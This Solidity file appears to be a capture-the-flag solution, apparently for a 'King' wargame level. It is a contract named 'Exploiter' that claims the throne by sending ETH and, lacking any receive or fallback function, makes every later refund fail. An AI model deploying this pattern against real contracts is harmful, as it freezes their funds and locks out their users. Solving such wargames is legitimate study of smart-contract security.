// SPDX-License-Identifier: Apache-2.0

// solhint-disable-next-line compiler-version
pragma solidity >=0.6.9 <0.9.0;
contract Exploiter {

    // This contract has no fallback, receive, or payable functions, so it can't receive ETH.
    constructor(address payable to) public payable {
        (bool success, ) = address(to).call{value: msg.value}("");
        require(success, "not new king... yet");
    }

}